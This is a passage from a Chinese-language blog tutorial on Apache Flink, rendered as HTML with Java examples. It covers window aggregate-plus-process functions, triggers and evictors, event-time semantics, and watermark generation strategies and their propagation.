class="keyword">public</span> &lt;ACC，V，R&gt; SingleOutputStreamOperator&lt;R&gt; <span class="title">aggregate</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        AggregateFunction&lt;T，ACC，V&gt; aggFunction,</span></span></span><br><span class="line"><span class="function"><span class="params">        ProcessWindowFunction&lt;V，R，K，W&gt; windowFunction)</span></span></span><br><span class="line"><span class="function">        </span></span><br><span class="line"><span class="function"><span class="comment">// 这样调用的处理机制是：基于第一个参数（增量聚合函数）来处理窗口数据，每来一个数据就做一次聚合；等到窗口需要触发计算时，则调用第二个参数（全窗口函数）的处理逻辑输出结果。</span></span></span><br><span class="line"><span class="function"><span class="comment">// 需要注意的是，这里的全窗口函数就不再缓存所有数据了，而是直接将增量聚合函数的结果拿来当作了Iterable类型的输入</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> class WindowAggregateAndProcessDemo </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction());</span><br><span class="line"></span><br><span class="line">        KeyedStream&lt;WaterSensor, String&gt; sensorKS = sensorDS.keyBy(sensor -&gt; sensor.getId());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 窗口分配器</span></span><br><span class="line">        WindowedStream&lt;WaterSensor, String, TimeWindow&gt; sensorWS = sensorKS.window(TumblingProcessingTimeWindows.of(Time.seconds(<span class="number">10</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 窗口函数：</span></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 增量聚合 Aggregate + 全窗口 process</span></span><br><span class="line"><span class="comment">         * 1、增量聚合函数处理数据： 来一条计算一条</span></span><br><span class="line"><span class="comment">         * 2、窗口触发时， 增量聚合的结果（只有一条） 传递给 全窗口函数</span></span><br><span class="line"><span class="comment">         * 3、经过全窗口函数的处理包装后，输出</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * 结合两者的优点：</span></span><br><span class="line"><span class="comment">         * 1、增量聚合： 来一条计算一条，存储中间的计算结果，占用的空间少</span></span><br><span class="line"><span class="comment">         * 2、全窗口函数： 可以通过 上下文 实现灵活的功能</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        sensorWS.reduce()   //也可以传两个</span></span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;String&gt; result = sensorWS.aggregate(</span><br><span class="line">                <span class="keyword">new</span> MyAgg(),</span><br><span class="line">                <span class="keyword">new</span> MyProcess()</span><br><span class="line">        );</span><br><span class="line">        result.print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">WaterSensor</span>, <span class="title">Integer</span>, <span class="title">String</span>&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"创建累加器"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">add</span><span class="params">(WaterSensor value, Integer accumulator)</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"调用add方法,value="</span>+value);</span><br><span class="line">            <span class="keyword">return</span> accumulator + value.getVc();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getResult</span><span class="params">(Integer accumulator)</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"调用getResult方法"</span>);</span><br><span class="line">            <span class="keyword">return</span> accumulator.toString();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">merge</span><span class="params">(Integer a, Integer b)</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"调用merge方法"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 全窗口函数的输入类型 = 增量聚合函数的输出类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyProcess</span> <span class="keyword">extends</span> <span class="title">ProcessWindowFunction</span>&lt;<span class="title">String</span>,<span class="title">String</span>,<span class="title">String</span>,<span class="title">TimeWindow</span>&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(String s, Context context, Iterable&lt;String&gt; elements, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">long</span> startTs = context.window().getStart();</span><br><span class="line">            <span class="keyword">long</span> endTs = context.window().getEnd();</span><br><span class="line">            String windowStart = DateFormatUtils.format(startTs, <span class="string">"yyyy-MM-dd HH:mm:ss.SSS"</span>);</span><br><span class="line">            String windowEnd = DateFormatUtils.format(endTs, <span class="string">"yyyy-MM-dd HH:mm:ss.SSS"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">long</span> count = elements.spliterator().estimateSize();</span><br><span class="line"></span><br><span class="line">            out.collect(<span class="string">"key="</span> + s + <span class="string">"的窗口["</span> + windowStart + <span class="string">","</span> + windowEnd + <span class="string">")包含"</span> + count + <span class="string">"条数据===&gt;"</span> + elements.toString());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-6-其他API">1.6 其他API</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  触发器（Trigger）</span></span><br><span class="line"><span class="comment">// 触发器主要是用来控制窗口什么时候触发计算。所谓的“触发计算”，本质上就是执行窗口函数，所以可以认为是计算得到结果并输出的过程</span></span><br><span class="line">stream.keyBy(...)</span><br><span class="line">       .window(...)</span><br><span class="line">       .trigger(<span class="keyword">new</span> MyTrigger())</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除器（Evictor）</span></span><br><span class="line"><span class="comment">// 移除器主要用来定义移除某些数据的逻辑。基于WindowedStream调用.evictor()方法，就可以传入一个自定义的移除器（Evictor）。Evictor是一个接口，不同的窗口类型都有各自预实现的移除器</span></span><br><span class="line">stream.keyBy(...)</span><br><span class="line">       .window(...)</span><br><span class="line">       .evictor(<span class="keyword">new</span> MyEvictor())</span><br></pre></td></tr></table></figure><h2 id="2、时间语义">2、时间语义</h2><p><strong>在实际应用中，事件时间语义会更为常见</strong>。一般情况下，业务日志数据中都会记录数据生成的时间戳（timestamp），它就可以作为事件时间的判断基础。</p><p>在Flink中，由于处理时间比较简单，早期版本默认的时间语义是处理时间；而考虑到事件时间在实际应用中更为广泛，从Flink1.12版本开始，Flink已经将<strong>事件时间作为默认的时间语义</strong>了</p><h2 id="3、水位线（Watermark）">3、水位线（Watermark）</h2><h3 id="3-1-事件时间和窗口">3.1 事件时间和窗口</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646754.png" alt></p><h3 id="3-2-什么是水位线">3.2 什么是水位线</h3><p>在Flink中，用来衡量事件时间进展的标记，就被称作“水位线”（Watermark）。</p><p><img src="http://qnypic.shawncoding.top/blog/202404161646755.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202404161646756.png" alt></p><p><strong>水位线特征</strong></p><ul><li>水位线是插入到<strong>数据流中的一个标记</strong>，可以认为是一个<strong>特殊的数据</strong></li><li>水位线主要的内容是一个时间戳，用来<strong>表示当前事件时间的进展</strong></li><li>水位线是<strong>基于数据的时间戳生成的</strong></li><li>水位线的时间戳必须<strong>单调递增</strong>，以确保任务的事件时间时钟一直向前推进</li><li>水位线可以通过<strong>设置延迟</strong>，来保证正确处理乱序数据</li><li>一个水位线Watermark(t)，表示在当前流中事件时间已经达到了时间戳t，<strong>这代表t之前的所有数据都到齐了，之后流中不会出现时间戳t’≤t的数据</strong></li></ul><p>水位线是Flink流处理中保证结果正确性的核心机制，它往往会跟窗口一起配合，完成对乱序数据的正确处理。</p><h3 id="3-3-水位线和窗口的工作原理">3.3 水位线和窗口的工作原理</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646757.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202404161646758.png" alt></p><p>**注意：**Flink中窗口并不是静态准备好的，而是动态创建——当有落在这个窗口区间范围的数据达到时，才创建对应的窗口。另外，这里我们认为到达窗口结束时间时，窗口就触发计算并关闭，事实上“触发计算”和“窗口关闭”两个行为也可以分开</p><h3 id="3-4-生成水位线">3.4 生成水位线</h3><p>所以Flink中的水位线，其实是流处理中对低延迟和结果正确性的一个权衡机制，而且把控制的权力交给了程序员，我们可以在代码中定义水位线的生成策略</p><p><strong>水位线生成策略</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用来为流中的数据分配时间戳</span></span><br><span class="line">DataStream&lt;Event&gt; stream = env.addSource(<span class="keyword">new</span> ClickSource());</span><br><span class="line"></span><br><span class="line">DataStream&lt;Event&gt; withTimestampsAndWatermarks = </span><br><span class="line">stream.assignTimestampsAndWatermarks(&lt;watermark strategy&gt;);</span><br><span class="line"><span class="comment">// 说明：WatermarkStrategy作为参数，这就是所谓的“水位线生成策略”。WatermarkStrategy是一个接口，该接口中包含了一个“时间戳分配器”TimestampAssigner和一个“水位线生成器”WatermarkGenerator</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">WatermarkStrategy</span>&lt;<span class="title">T</span>&gt; </span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">TimestampAssignerSupplier</span>&lt;<span class="title">T</span>&gt;,</span></span><br><span class="line"><span class="class">            <span class="title">WatermarkGeneratorSupplier</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 负责从流中数据元素的某个字段中提取时间戳，并分配给元素。时间戳的分配是生成水位线的基础。</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function">TimestampAssigner&lt;T&gt; <span class="title">createTimestampAssigner</span><span class="params">(TimestampAssignerSupplier.Context context)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主要负责按照既定的方式，基于时间戳生成水位线</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function">WatermarkGenerator&lt;T&gt; <span class="title">createWatermarkGenerator</span><span class="params">(WatermarkGeneratorSupplier.Context context)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Flink内置水位线</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有序流中内置水位线设置</span></span><br><span class="line"><span class="comment">// 对于有序流，主要特点就是时间戳单调增长，所以永远不会出现迟到数据的问题。这是周期性生成水位线的最简单的场景</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WatermarkMonoDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 1.定义Watermark策略</span></span><br><span class="line">        WatermarkStrategy&lt;WaterSensor&gt; watermarkStrategy = WatermarkStrategy</span><br><span class="line">                <span class="comment">// 1.1 指定watermark生成：升序的watermark，没有等待时间</span></span><br><span class="line">                .&lt;WaterSensor&gt;forMonotonousTimestamps()</span><br><span class="line">                <span class="comment">// 1.2 指定 时间戳分配器，从数据中提取</span></span><br><span class="line">                .withTimestampAssigner(<span class="keyword">new</span> SerializableTimestampAssigner&lt;WaterSensor&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(WaterSensor element, <span class="keyword">long</span> recordTimestamp)</span> </span>&#123;</span><br><span class="line">                        <span class="comment">// 返回的时间戳，要 毫秒</span></span><br><span class="line">                        System.out.println(<span class="string">"数据="</span> + element + <span class="string">",recordTs="</span> + recordTimestamp);</span><br><span class="line">                        <span class="keyword">return</span> element.getTs() * <span class="number">1000L</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">        <span class="comment">// TODO 2. 指定 watermark策略</span></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDSwithWatermark = sensorDS.assignTimestampsAndWatermarks(watermarkStrategy);</span><br><span class="line">        sensorDSwithWatermark.keyBy(sensor -&gt; sensor.getId())</span><br><span class="line">                <span class="comment">// TODO 3.使用 事件时间语义 的窗口</span></span><br><span class="line">                .window(TumblingEventTimeWindows.of(Time.seconds(<span class="number">10</span>)))</span><br><span class="line">                .process(</span><br><span class="line">                        <span class="keyword">new</span> ProcessWindowFunction&lt;WaterSensor, String, String, TimeWindow&gt;() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(String s, Context context, Iterable&lt;WaterSensor&gt; elements, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="keyword">long</span> startTs = context.window().getStart();</span><br><span class="line">                                <span class="keyword">long</span> endTs = context.window().getEnd();</span><br><span class="line">                                String windowStart = DateFormatUtils.format(startTs, <span class="string">"yyyy-MM-dd HH:mm:ss.SSS"</span>);</span><br><span class="line">                                String windowEnd = DateFormatUtils.format(endTs, <span class="string">"yyyy-MM-dd HH:mm:ss.SSS"</span>);</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">long</span> count = elements.spliterator().estimateSize();</span><br><span class="line"></span><br><span class="line">                                out.collect(<span class="string">"key="</span> + s + <span class="string">"的窗口["</span> + windowStart + <span class="string">","</span> + windowEnd + <span class="string">")包含"</span> + count + <span class="string">"条数据===&gt;"</span> + elements.toString());</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                )</span><br><span class="line">                .print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 乱序流中内置水位线设置</span></span><br><span class="line"><span class="comment">// 由于乱序流中需要等待迟到数据到齐，所以必须设置一个固定量的延迟时间</span></span><br><span class="line"><span class="comment">// 这时生成水位线的时间戳，就是当前数据流中最大的时间戳减去延迟的结果，相当于把表调慢，当前时钟会滞后于数据的最大时间戳</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WatermarkOutOfOrdernessDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction());</span><br><span class="line">        <span class="comment">// TODO 1.定义Watermark策略</span></span><br><span class="line">        WatermarkStrategy&lt;WaterSensor&gt; watermarkStrategy = WatermarkStrategy</span><br><span class="line">                <span class="comment">// 1.1 指定watermark生成：乱序的，等待3s</span></span><br><span class="line">                .&lt;WaterSensor&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>))</span><br><span class="line">                <span class="comment">// 1.2 指定 时间戳分配器，从数据中提取</span></span><br><span class="line">                .withTimestampAssigner(</span><br><span class="line">                        (element, recordTimestamp) -&gt; &#123;</span><br><span class="line">                            <span class="comment">// 返回的时间戳，要 毫秒</span></span><br><span class="line">                            System.out.println(<span class="string">"数据="</span> + element + <span class="string">",recordTs="</span> + recordTimestamp);</span><br><span class="line">                            <span class="keyword">return</span> element.getTs() * <span class="number">1000L</span>;</span><br><span class="line">                        &#125;);</span><br><span class="line">        <span class="comment">// TODO 2. 指定 watermark策略</span></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDSwithWatermark = sensorDS.assignTimestampsAndWatermarks(watermarkStrategy);</span><br><span class="line">        sensorDSwithWatermark.keyBy(sensor -&gt; sensor.getId())</span><br><span class="line">                <span class="comment">// TODO 3.使用 事件时间语义 的窗口</span></span><br><span class="line">                .window(TumblingEventTimeWindows.of(Time.seconds(<span class="number">10</span>)))</span><br><span class="line">                .process(</span><br><span class="line">                        <span class="keyword">new</span> ProcessWindowFunction&lt;WaterSensor, String, String, TimeWindow&gt;() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(String s, Context context, Iterable&lt;WaterSensor&gt; elements, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="keyword">long</span> startTs = context.window().getStart();</span><br><span class="line">                                <span class="keyword">long</span> endTs = context.window().getEnd();</span><br><span class="line">                                String windowStart = DateFormatUtils.format(startTs, <span class="string">"yyyy-MM-dd HH:mm:ss.SSS"</span>);</span><br><span class="line">                                String windowEnd = DateFormatUtils.format(endTs, <span class="string">"yyyy-MM-dd HH:mm:ss.SSS"</span>);</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">long</span> count = elements.spliterator().estimateSize();</span><br><span class="line"></span><br><span class="line">                                out.collect(<span class="string">"key="</span> + s + <span class="string">"的窗口["</span> + windowStart + <span class="string">","</span> + windowEnd + <span class="string">")包含"</span> + count + <span class="string">"条数据===&gt;"</span> + elements.toString());</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                )</span><br><span class="line">                .print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>自定义水位线生成器</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 周期性水位线生成器（Periodic Generator）</span></span><br><span class="line"><span class="comment">// 周期性生成器一般是通过onEvent()观察判断输入的事件，而在onPeriodicEmit()里发出水位线</span></span><br><span class="line"><span class="comment">// 自定义水位线的产生</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomPeriodicWatermarkExample</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        env</span><br><span class="line">                .addSource(<span class="keyword">new</span> ClickSource())</span><br><span class="line">                .assignTimestampsAndWatermarks(<span class="keyword">new</span> CustomWatermarkStrategy())</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomWatermarkStrategy</span> <span class="keyword">implements</span> <span class="title">WatermarkStrategy</span>&lt;<span class="title">Event</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> TimestampAssigner&lt;Event&gt; <span class="title">createTimestampAssigner</span><span class="params">(TimestampAssignerSupplier.Context context)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SerializableTimestampAssigner&lt;Event&gt;() &#123;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(Event element，<span class="keyword">long</span> recordTimestamp)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> element.timestamp; <span class="comment">// 告诉程序数据源里的时间戳是哪一个字段</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> WatermarkGenerator&lt;Event&gt; <span class="title">createWatermarkGenerator</span><span class="params">(WatermarkGeneratorSupplier.Context context)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> CustomBoundedOutOfOrdernessGenerator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomBoundedOutOfOrdernessGenerator</span> <span class="keyword">implements</span> <span class="title">WatermarkGenerator</span>&lt;<span class="title">Event</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Long delayTime = <span class="number">5000L</span>; <span class="comment">// 延迟时间</span></span><br><span class="line">        <span class="keyword">private</span> Long maxTs = -Long.MAX_VALUE + delayTime + <span class="number">1L</span>; <span class="comment">// 观察到的最大时间戳</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onEvent</span><span class="params">(Event event，<span class="keyword">long</span> eventTimestamp，WatermarkOutput output)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 每来一条数据就调用一次</span></span><br><span class="line">            maxTs = Math.max(event.timestamp，maxTs); <span class="comment">// 更新最大时间戳</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onPeriodicEmit</span><span class="params">(WatermarkOutput output)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 发射水位线，默认200ms调用一次</span></span><br><span class="line">            output.emitWatermark(<span class="keyword">new</span> Watermark(maxTs - delayTime - <span class="number">1L</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 我们在onPeriodicEmit()里调用output.emitWatermark()，就可以发出水位线了；这个方法由系统框架周期性地调用，默认200ms一次</span></span><br><span class="line"><span class="comment">// 如果想修改默认周期时间，可以通过下面方法修改。例如：修改为400ms</span></span><br><span class="line"><span class="comment">// env.getConfig().setAutoWatermarkInterval(400L);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 断点式水位线生成器（Punctuated Generator）</span></span><br><span class="line"><span class="comment">// 断点式生成器会不停地检测onEvent()中的事件，当发现带有水位线信息的事件时，就立即发出水位线。我们把发射水位线的逻辑写在onEvent方法当中即可</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在数据源中发送水位线</span></span><br><span class="line"><span class="comment">// 我们也可以在自定义的数据源中抽取事件时间，然后发送水位线</span></span><br><span class="line">env.fromSource(</span><br><span class="line">kafkaSource, WatermarkStrategy.forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>)), <span class="string">"kafkasource"</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="3-5-水位线的传递">3.5 水位线的传递</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646759.png" alt></p><p>多并行度下以最小的那个作为当前任务的事件时钟</p><h3 id="3-6-迟到数据的处理">3.6 迟到数据的处理 